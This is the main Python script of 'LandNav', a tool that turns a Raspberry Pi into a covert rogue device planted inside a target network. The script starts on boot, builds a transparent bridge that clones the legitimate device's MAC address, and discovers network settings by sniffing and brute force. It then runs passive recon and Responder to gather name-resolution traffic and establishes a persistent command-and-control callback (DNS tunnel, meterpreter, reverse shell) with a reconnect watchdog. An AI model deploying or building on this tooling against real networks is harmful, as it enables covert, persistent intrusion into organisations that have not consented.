#!/usr/bin/env python3
"""LandNav — Automated rogue device network bootstrapper.

Automates the entire lifecycle of a drop device deployment:
  1. Detect interfaces and deployment mode (bridge vs standalone)
  2. Establish transparent bridge or direct network access
  3. Discover network configuration (DHCP, ARP, LLDP, brute force)
  4. Configure the Pi's network connectivity
  5. Start passive recon + Responder analyzer (continuous intelligence)
  6. Establish C2 callback (DNS tunnel → meterpreter → reverse shell)
  7. Monitor and re-establish C2 on failure

Designed for Raspberry Pi 4B running Kali Linux ARM.
Deployed via systemd — runs automatically on boot.

Usage:
    python3 landnav.py                  # Normal operation (boot mode)
    python3 landnav.py --config FILE    # Use alternate config
    python3 landnav.py --dry-run        # Log actions without executing
    python3 landnav.py --status         # Print current state and exit
"""

VERSION = "0.3.1"

import argparse
import logging
import logging.handlers
import os
import signal
import sys
import time
import yaml
from pathlib import Path

# Ensure lib/ is importable
_HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(_HERE))

from lib import led
from lib import netconfig
from lib import bridge
from lib import discovery
from lib import egress
from lib.passive import PassiveCollector
from lib.responder import ResponderAnalyzer

# ── Constants ───────────────────────────────────────────────────

DEFAULT_CONFIG = _HERE / "config.yaml"
LOCK_FILE = Path("/var/run/landnav.pid")

log = logging.getLogger("landnav")

# Passive recon + Responder handles (module-level for status/cleanup)
_passive_collector = None
_responder_analyzer = None

# ── Logging Setup ───────────────────────────────────────────────

def setup_logging(cfg):
    """Configure logging with file rotation and optional console output."""
    log_dir = Path(cfg.get("directory", "/opt/pr0t31n/landnav/logs"))
    log_dir.mkdir(parents=True, exist_ok=True)
    level = getattr(logging, cfg.get("level", "INFO").upper(), logging.INFO)

    root = logging.getLogger()
    root.setLevel(level)

    fmt = logging.Formatter(
        "%(asctime)s [%(levelname)-8s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Rotating file handler
    max_bytes = cfg.get("max_size_mb", 50) * 1024 * 1024
    fh = logging.handlers.RotatingFileHandler(
        log_dir / "landnav.log", maxBytes=max_bytes, backupCount=3,
    )
    fh.setFormatter(fmt)
    root.addHandler(fh)

    # Console handler
    if cfg.get("console", True):
        ch = logging.StreamHandler(sys.stdout)
        ch.setFormatter(fmt)
        root.addHandler(ch)

# ── PID Lock ────────────────────────────────────────────────────

def acquire_lock():
    if LOCK_FILE.exists():
        try:
            old_pid = int(LOCK_FILE.read_text().strip())
            # Check if old process is still running
            os.kill(old_pid, 0)
            log.error("Another LandNav instance is running (PID %d)", old_pid)
            return False
        except (OSError, ValueError):
            pass  # Stale PID file
    LOCK_FILE.write_text(str(os.getpid()))
    return True

def release_lock():
    LOCK_FILE.unlink(missing_ok=True)

# ── Signal Handlers ─────────────────────────────────────────────

_shutdown = False

def _handle_signal(signum, frame):
    global _shutdown
    log.info("Received signal %d — shutting down", signum)
    _shutdown = True

# ── Phase 1: Interface Detection ───────────────────────────────

def phase_detect_interfaces(cfg):
    """Detect ethernet interfaces and determine deployment mode.

    Performs a thorough review of existing networking before deciding:
      1. Check for existing system-managed bridge → use it (bridge-reuse mode)
      2. Check for USB-ethernet adapter → LandNav bridge mode
      3. Single ethernet only → standalone mode

    Returns:
        dict: mode ("bridge"|"bridge-reuse"|"standalone"),
              uplink, downstream, existing_bridge (bool)
    """
    log.info("════════ Phase 1: Interface Detection ════════")

    # ── Step 1: Check for existing system-managed bridge ───────
    # If br0 (or another bridge) already exists with connectivity,
    # LandNav should use it rather than destroying and recreating.
    if netconfig.interface_exists(bridge.BRIDGE_NAME):
        br_info = netconfig.get_interface_info(bridge.BRIDGE_NAME)
        br_members = netconfig.get_bridge_ports(bridge.BRIDGE_NAME)
        is_system = netconfig.is_system_managed_bridge(bridge.BRIDGE_NAME)
        log.info("Existing bridge %s: state=%s ip=%s members=%s system_managed=%s",
                 bridge.BRIDGE_NAME, br_info["state"], br_info["ip"],
                 br_members, is_system)

        if is_system and br_info["ip"] and br_info["state"] == "UP":
            log.info("System-managed bridge %s is UP with IP %s — using it directly",
                     bridge.BRIDGE_NAME, br_info["ip"])
            # Identify which member is the uplink (has carrier to the network)
            uplink = br_members[0] if br_members else None
            return {
                "mode": "bridge-reuse",
                "uplink": uplink,
                "downstream": br_members[1] if len(br_members) > 1 else None,
                "existing_bridge": True,
            }

    # ── Step 2: Detect physical ethernet interfaces ────────────
    ifaces = netconfig.detect_interfaces()
    log.info("Detected physical interfaces: %s", ifaces)

    uplink = ifaces["onboard"]
    usb_eth = ifaces["usb_eth"]

    if not uplink:
        log.error("No onboard ethernet interface found")
        return None

    # Check for physical link on uplink
    netconfig.set_interface_up(uplink)
    time.sleep(2)

    if not netconfig.interface_has_carrier(uplink):
        log.warning("%s has no carrier — cable may not be connected", uplink)
        # Continue anyway — cable might be connected after boot

    bridge_cfg = cfg.get("network", {}).get("bridge", {})

    if usb_eth and bridge_cfg.get("auto_detect", True):
        log.info("USB-ethernet detected (%s) — BRIDGE mode", usb_eth)
        netconfig.set_interface_up(usb_eth)
        return {"mode": "bridge", "uplink": uplink, "downstream": usb_eth,
                "existing_bridge": False}
    else:
        log.info("No USB-ethernet — STANDALONE mode on %s", uplink)
        return {"mode": "standalone", "uplink": uplink, "downstream": None,
                "existing_bridge": False}

# ── Phase 2: Network Setup ─────────────────────────────────────

def phase_network_setup(iface_info, cfg):
    """Establish network connectivity.

    Bridge-reuse: System bridge already working — read existing config.
    Bridge mode:  Create bridge, sniff legit device traffic, learn config.
    Standalone:   DHCP → passive sniff → active probe → brute force.

    Returns:
        discovery.NetworkConfig on success, None on failure
    """
    log.info("════════ Phase 2: Network Setup ════════")

    net_cfg = cfg.get("network", {})
    disc_cfg = net_cfg.get("discovery", {})
    mode = iface_info["mode"]
    uplink = iface_info["uplink"]
    downstream = iface_info["downstream"]

    if mode == "bridge-reuse":
        return _setup_bridge_reuse_mode(net_cfg)
    elif mode == "bridge":
        return _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg)
    else:
        return _setup_standalone_mode(uplink, net_cfg, disc_cfg)


def _setup_bridge_reuse_mode(net_cfg):
    """Use an existing system-managed bridge that already has connectivity."""
    import re as _re
    br_info = netconfig.get_interface_info(bridge.BRIDGE_NAME)
    log.info("Using existing bridge %s: IP=%s", bridge.BRIDGE_NAME, br_info["ip"])

    config = discovery.NetworkConfig()
    config.ip = br_info["ip"]
    config.cidr = br_info["cidr"] or 24
    config.discovery_method = "existing-bridge"

    # Read gateway from routing table
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                         capture_output=True, text=True, check=False, timeout=5)
        m = _re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", r.stdout)
        if m:
            config.gateway = m.group(1)
    except Exception:
        pass

    # Read DNS from resolv.conf
    try:
        resolv = Path("/etc/resolv.conf").read_text()
        config.dns_servers = [
            line.split()[1] for line in resolv.splitlines()
            if line.strip().startswith("nameserver") and len(line.split()) >= 2
        ]
    except Exception:
        config.dns_servers = net_cfg.get("fallback_dns", ["8.8.8.8"])

    # Enable promiscuous mode for passive recon
    try:
        netconfig.set_interface_promisc(bridge.BRIDGE_NAME, True)
    except Exception:
        pass

    log.info("Bridge reuse: IP=%s GW=%s DNS=%s",
             config.ip, config.gateway, config.dns_servers)
    return config


def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
    """Bridge mode network setup."""
    bridge_cfg = net_cfg.get("bridge", {})

    # Create the bridge
    led.set_state(led.BRIDGE_UP)
    if not bridge.create_bridge(uplink, downstream, stp=bridge_cfg.get("stp", False)):
        log.error("Bridge creation failed — falling back to standalone")
        return _setup_standalone_mode(uplink, net_cfg, disc_cfg)

    log.info("Bridge active — sniffing for legitimate device traffic")
    led.set_state(led.DISCOVERY)

    # Learn the downstream device's MAC
    legit_mac = bridge.get_downstream_mac(downstream,
                                           timeout=disc_cfg.get("dhcp_timeout", 30))

    # Sniff DHCP from the legitimate device
    net_config = discovery.sniff_dhcp(
        bridge.BRIDGE_NAME,
        timeout=disc_cfg.get("dhcp_timeout", 30),
    )

    # If no DHCP, try ARP observation
    if not net_config.gateway:
        log.info("No DHCP observed — trying ARP sniff")
        arp_config = discovery.sniff_arp(
            bridge.BRIDGE_NAME,
            timeout=disc_cfg.get("sniff_timeout", 60),
        )
        if arp_config.gateway:
            net_config = arp_config

    # If still no gateway, try LLDP/CDP
    if not net_config.gateway:
        log.info("No ARP data — trying LLDP/CDP")
        switch_info = discovery.sniff_lldp_cdp(bridge.BRIDGE_NAME, timeout=65)
        if switch_info.get("mgmt_ip"):
            log.info("Switch management IP: %s (VLAN: %s)",
                     switch_info["mgmt_ip"], switch_info.get("vlan"))

    # Extended sniff if first pass failed
    if not net_config.gateway:
        ext_timeout = disc_cfg.get("sniff_extended", 300)
        log.info("Extended passive sniff (%ds)", ext_timeout)
        net_config = discovery.sniff_arp(bridge.BRIDGE_NAME, timeout=ext_timeout)

    # Active probing as fallback
    if not net_config.gateway:
        log.info("Passive sniffing failed — active ARP probing")
        probe_result = discovery.probe_for_gateway(bridge.BRIDGE_NAME)
        if probe_result:
            net_config = probe_result

    # Brute force as last resort
    if not net_config.gateway and disc_cfg.get("brute_force", True):
        log.info("Active probing failed — brute force")
        bf_result = discovery.brute_force_subnet(
            bridge.BRIDGE_NAME,
            timeout=disc_cfg.get("brute_force_timeout", 1800),
        )
        if bf_result:
            net_config = bf_result

    if not net_config.gateway:
        log.error("All network discovery methods failed")
        return None

    # Use legit device's MAC if discovered
    if legit_mac:
        net_config.client_mac = legit_mac

    # Set up MAC transparency
    if bridge_cfg.get("mac_transparency", True) and net_config.client_mac:
        bridge.set_mac_transparency(net_config.client_mac, uplink)

    # Find an unused IP for the Pi
    if not net_config.cidr:
        net_config.cidr = 24

    pi_ip = discovery.find_unused_ip(
        net_config.gateway,
        cidr=net_config.cidr,
        preferred_octets=net_cfg.get("fallback_octets",
                                     [net_cfg.get("preferred_ip_octet", 236)]),
        iface=bridge.BRIDGE_NAME,
    )

    if not pi_ip:
        log.error("No unused IP available")
        return None

    net_config.ip = pi_ip

    # Configure the Pi's IP on the bridge
    dns_servers = net_config.dns_servers or net_cfg.get("fallback_dns", ["8.8.8.8"])
    bridge.configure_bridge_ip(
        pi_ip, net_config.cidr, net_config.gateway,
        dns_servers=dns_servers, domain=net_config.domain,
    )

    return net_config


def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
    """Standalone mode (eth0 only) network setup."""
    led.set_state(led.DISCOVERY)

    # Step 1: Check if we already have connectivity
    info = netconfig.get_interface_info(uplink)
    if info["ip"]:
        log.info("Interface %s already has IP %s — checking connectivity", uplink, info["ip"])
        if netconfig.internet_reachable():
            config = discovery.NetworkConfig()
            config.ip = info["ip"]
            config.cidr = info["cidr"] or 24
            config.discovery_method = "preexisting"
            return config

    # Step 2: Try DHCP
    log.info("Attempting DHCP on %s", uplink)
    if netconfig.run_dhclient(uplink, timeout=disc_cfg.get("dhcp_timeout", 30)):
        info = netconfig.get_interface_info(uplink)
        config = discovery.NetworkConfig()
        config.ip = info["ip"]
        config.cidr = info["cidr"] or 24
        config.discovery_method = "dhcp"
        # Read gateway from routing table
        try:
            r = subprocess.run(["ip", "route", "show", "default"],
                             capture_output=True, text=True, check=False, timeout=5)
            import re
            m = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", r.stdout)
            if m:
                config.gateway = m.group(1)
        except Exception:
            pass
        return config

    netconfig.release_dhcp(uplink)

    # Step 3: Passive sniff (ARP)
    log.info("DHCP failed — passive ARP sniff")
    # Need a temporary IP-less config to sniff
    netconfig.set_interface_up(uplink)
    netconfig.set_interface_promisc(uplink, True)

    net_config = discovery.sniff_arp(uplink, timeout=disc_cfg.get("sniff_timeout", 60))

    # Extended sniff if needed
    if not net_config.gateway:
        ext = disc_cfg.get("sniff_extended", 300)
        log.info("Short sniff failed — extended sniff (%ds)", ext)
        net_config = discovery.sniff_arp(uplink, timeout=ext)

    # Step 4: Active ARP probing
    if not net_config.gateway:
        log.info("Passive sniff failed — active ARP probing")
        probe = discovery.probe_for_gateway(uplink)
        if probe:
            net_config = probe

    # Step 5: Brute force
    if not net_config.gateway and disc_cfg.get("brute_force", True):
        log.info("Active probing failed — brute force")
        bf = discovery.brute_force_subnet(
            uplink, timeout=disc_cfg.get("brute_force_timeout", 1800),
        )
        if bf:
            net_config = bf

    if not net_config.gateway:
        log.error("All standalone discovery methods failed")
        return None

    # Assign an IP
    if not net_config.cidr:
        net_config.cidr = 24

    pi_ip = discovery.find_unused_ip(
        net_config.gateway, cidr=net_config.cidr,
        preferred_octets=net_cfg.get("fallback_octets",
                                     [net_cfg.get("preferred_ip_octet", 236)]),
        iface=uplink,
    )
    if not pi_ip:
        log.error("No unused IP available")
        return None

    net_config.ip = pi_ip
    netconfig.set_interface_promisc(uplink, False)
    netconfig.set_ip(uplink, pi_ip, net_config.cidr)
    netconfig.set_default_route(net_config.gateway, uplink)

    dns_servers = net_config.dns_servers or net_cfg.get("fallback_dns", ["8.8.8.8"])
    netconfig.set_dns(dns_servers, net_config.domain)

    return net_config

# ── Phase 3: Network Validation ────────────────────────────────

def phase_validate_network(net_config, cfg):
    """Verify connectivity and discover services (DNS, proxy).

    Returns: True if network is usable, False otherwise
    """
    log.info("════════ Phase 3: Network Validation ════════")

    if not net_config or not net_config.ip:
        log.error("No network configuration to validate")
        return False

    # Layer 2: ARP the gateway
    if net_config.gateway:
        if netconfig.can_reach_gateway(net_config.gateway):
            log.info("✓ Gateway %s reachable (Layer 2)", net_config.gateway)
        else:
            log.warning("✗ Gateway %s unreachable via ARP", net_config.gateway)

    # Layer 3: Ping the gateway
    if net_config.gateway:
        if netconfig.ping(net_config.gateway):
            log.info("✓ Gateway %s responds to ping (Layer 3)", net_config.gateway)
        else:
            log.warning("✗ Gateway %s does not respond to ping", net_config.gateway)

    # DNS: Discover and test servers
    net_cfg = cfg.get("network", {})
    fallback_dns = net_cfg.get("fallback_dns", ["8.8.8.8", "1.1.1.1"])

    if not net_config.dns_servers:
        log.info("No DNS servers from discovery — searching")
        net_config.dns_servers = discovery.discover_dns_servers(
            net_config.gateway, net_config,
        )

    if net_config.dns_servers:
        log.info("✓ DNS servers: %s", net_config.dns_servers)
        netconfig.set_dns(net_config.dns_servers, net_config.domain)
    else:
        log.warning("No local DNS found — using fallback: %s", fallback_dns)
        net_config.dns_servers = fallback_dns
        netconfig.set_dns(fallback_dns)

    # Test DNS resolution
    resolved = netconfig.dns_resolves(cfg["c2"]["host"])
    if resolved:
        log.info("✓ DNS resolves %s → %s", cfg["c2"]["host"], resolved)
    else:
        log.warning("✗ Cannot resolve %s — C2 may need IP fallback", cfg["c2"]["host"])

    # Proxy detection
    proxy_cfg = net_cfg.get("proxy", {})
    if proxy_cfg.get("host"):
        # Manual proxy
        net_config.proxy_host = proxy_cfg["host"]
        net_config.proxy_port = proxy_cfg["port"]
        log.info("Using manual proxy: %s:%d", net_config.proxy_host, net_config.proxy_port)
    elif proxy_cfg.get("auto_detect", True):
        proxy_host, proxy_port = discovery.detect_proxy(net_config.gateway)
        if proxy_host:
            net_config.proxy_host = proxy_host
            net_config.proxy_port = proxy_port
            log.info("✓ Proxy detected: %s:%d", proxy_host, proxy_port)
        else:
            log.info("No proxy detected")

    # Internet connectivity
    if netconfig.internet_reachable():
        log.info("✓ Internet reachable")
    else:
        log.info("✗ Internet not reachable — C2 will use internal routes / DNS tunnel")

    led.set_state(led.NETWORK_UP)
    return True

# ── Passive Recon Launch ───────────────────────────────────────

def start_passive_recon(iface_info, cfg):
    """Start passive network intelligence collection and Responder analyzer.

    Runs as background daemon threads — collects ARP, DNS, DHCP, NetBIOS,
    LLMNR, mDNS, SSDP traffic plus Responder analyze-mode output.
    Continues running for the entire lifetime of the deployment.

    Returns: (PassiveCollector, ResponderAnalyzer) or (None, None)
    """
    global _passive_collector, _responder_analyzer

    passive_cfg = cfg.get("passive", {})
    responder_cfg = cfg.get("responder", {})

    if not passive_cfg.get("enabled", True):
        log.info("Passive recon disabled in config")
        return None, None

    # Use bridge interface if in bridge mode, otherwise uplink
    if iface_info["mode"] == "bridge" and bridge.bridge_is_up():
        sniff_iface = bridge.BRIDGE_NAME
    else:
        sniff_iface = iface_info["uplink"]

    recon_dir = Path(cfg.get("logging", {}).get(
        "directory", "/opt/pr0t31n/landnav/logs")) / "recon"

    log.info("════════ Passive Recon: Starting ════════")

    # Start passive packet collector
    flush_interval = passive_cfg.get("flush_interval", 30)
    _passive_collector = PassiveCollector(
        iface=sniff_iface,
        recon_dir=str(recon_dir),
        flush_interval=flush_interval,
    )
    _passive_collector.start()
    log.info("Passive collector started on %s (flush every %ds)",
             sniff_iface, flush_interval)

    # Start Responder in analyze mode
    if responder_cfg.get("enabled", True):
        responder_path = responder_cfg.get("path")
        _responder_analyzer = ResponderAnalyzer(
            iface=sniff_iface,
            recon_dir=str(recon_dir),
            responder_path=responder_path,
        )
        if _responder_analyzer.start():
            log.info("Responder analyzer started on %s", sniff_iface)
        else:
            log.warning("Responder analyzer failed to start — continuing without it")
            _responder_analyzer = None
    else:
        log.info("Responder analyzer disabled in config")
        _responder_analyzer = None

    return _passive_collector, _responder_analyzer


def stop_passive_recon():
    """Stop passive recon and Responder. Flushes final data to disk."""
    global _passive_collector, _responder_analyzer

    if _responder_analyzer:
        log.info("Stopping Responder analyzer")
        _responder_analyzer.stop()
        _responder_analyzer = None

    if _passive_collector:
        log.info("Stopping passive collector (%d hosts observed)",
                 _passive_collector.get_host_count())
        _passive_collector.stop()
        _passive_collector = None

# ── Phase 4: C2 Egress ─────────────────────────────────────────

def phase_c2_egress(net_config, cfg):
    """Establish C2 callback.

    Returns: str method name on success, None on failure
    """
    log.info("════════ Phase 4: C2 Egress Cascade ════════")
    led.set_state(led.C2_ATTEMPT)

    # Inject detected proxy into config for egress module
    if net_config.proxy_host:
        cfg["_detected_proxy_host"] = net_config.proxy_host
        cfg["_detected_proxy_port"] = net_config.proxy_port

    method = egress.run_cascade(cfg)

    if method:
        log.info("════════ C2 ESTABLISHED via %s ════════", method)
        led.set_state(led.C2_CONNECTED)

        # Log passive recon status for operator awareness
        if _passive_collector:
            log.info("Passive recon active: %d hosts, %d subnets observed",
                     _passive_collector.get_host_count(),
                     len(_passive_collector.get_targets()))
        if _responder_analyzer and _responder_analyzer.is_running():
            log.info("Responder analyzer active — LLMNR/NBT-NS/WPAD intelligence collecting")
    else:
        log.error("════════ C2 FAILED — all methods exhausted ════════")
        led.set_state(led.ERROR)

    return method

# ── Main ────────────────────────────────────────────────────────

def main():
    global _shutdown

    parser = argparse.ArgumentParser(
        description="LandNav v%s — Rogue device network bootstrapper" % VERSION,
    )
    parser.add_argument("--config", "-c", default=str(DEFAULT_CONFIG),
                        help="Path to config.yaml")
    parser.add_argument("--dry-run", action="store_true",
                        help="Log actions without executing network changes")
    parser.add_argument("--status", action="store_true",
                        help="Print current state and exit")
    parser.add_argument("--version", "-v", action="version",
                        version=f"LandNav {VERSION}")
    args = parser.parse_args()

    # Load config
    config_path = Path(args.config)
    if not config_path.exists():
        print(f"ERROR: Config file not found: {config_path}", file=sys.stderr)
        print(f"Copy config.yaml.example to config.yaml and edit it.", file=sys.stderr)
        sys.exit(1)

    with open(config_path) as f:
        cfg = yaml.safe_load(f)

    # Setup logging
    setup_logging(cfg.get("logging", {}))
    log.info("LandNav v%s starting", VERSION)

    # Status mode
    if args.status:
        print(f"LandNav v{VERSION}")
        print(f"C2 State: {egress._current_state}")
        print(f"C2 Method: {egress._c2_method or 'none'}")
        if bridge.bridge_is_up():
            print(f"Bridge: UP ({bridge.BRIDGE_NAME})")
        if _passive_collector:
            print(f"Passive Recon: {_passive_collector.get_host_count()} hosts observed")
            print(f"Subnets: {', '.join(_passive_collector.get_targets())}")
        if _responder_analyzer and _responder_analyzer.is_running():
            print(f"Responder: ACTIVE (analyze mode)")
        sys.exit(0)

    # PID lock
    if not acquire_lock():
        sys.exit(1)

    # Signal handlers
    signal.signal(signal.SIGTERM, _handle_signal)
    signal.signal(signal.SIGINT, _handle_signal)

    # Initialize LED
    led_cfg = cfg.get("led", {})
    led.init(
        led_path=led_cfg.get("path", "/sys/class/leds/ACT"),
        enabled=led_cfg.get("enabled", True),
    )
    led.set_state(led.BOOTING)

    try:
        # ── Phase 1: Interface Detection ────────────────────
        iface_info = phase_detect_interfaces(cfg)
        if not iface_info:
            log.error("No usable network interface — aborting")
            led.set_state(led.ERROR)
            time.sleep(30)
            sys.exit(1)

        # ── Phase 2: Network Setup ──────────────────────────
        net_config = phase_network_setup(iface_info, cfg)
        if not net_config:
            log.error("Network setup failed — aborting")
            led.set_state(led.ERROR)
            time.sleep(30)
            sys.exit(1)

        log.info("Network acquired: IP=%s/%s GW=%s DNS=%s (via %s)",
                 net_config.ip, net_config.cidr, net_config.gateway,
                 net_config.dns_servers, net_config.discovery_method)

        # ── Phase 3: Validation ─────────────────────────────
        phase_validate_network(net_config, cfg)

        # ── Start passive recon (runs continuously) ─────────
        start_passive_recon(iface_info, cfg)

        # ── Phase 4: C2 Egress ──────────────────────────────
        retry_interval = cfg["c2"].get("retry_interval", 60)

        while not _shutdown:
            method = phase_c2_egress(net_config, cfg)

            if method:
                # C2 connected — start watchdog and wait
                log.info("C2 active — starting watchdog")
                egress.start_watchdog(cfg, on_reconnect=lambda m: led.set_state(led.C2_CONNECTED))

                # Block until shutdown signal
                while not _shutdown:
                    time.sleep(5)
                    # If C2 dropped and watchdog couldn't recover, re-enter cascade
                    if egress._current_state == egress.EgressState.FAILED:
                        log.warning("Watchdog reports C2 failed — re-entering cascade")
                        led.set_state(led.C2_ATTEMPT)
                        break

                egress.stop_watchdog()

                if _shutdown:
                    break
            else:
                # All methods failed — wait and retry
                log.info("Retrying C2 cascade in %ds", retry_interval)
                led.set_state(led.ERROR)

                for _ in range(retry_interval):
                    if _shutdown:
                        break
                    time.sleep(1)

    except Exception as e:
        log.exception("Unhandled exception: %s", e)
        led.set_state(led.ERROR)
    finally:
        log.info("LandNav shutting down")
        led.set_state(led.SHUTDOWN)

        # Stop passive recon and flush final data
        stop_passive_recon()

        time.sleep(3)
        led.stop()

        # Cleanup bridge — destroy_bridge() is safe: it checks the marker
        # file and refuses to touch system-managed or non-LandNav bridges.
        bridge.destroy_bridge()

        release_lock()
        log.info("LandNav stopped")


if __name__ == "__main__":
    main()
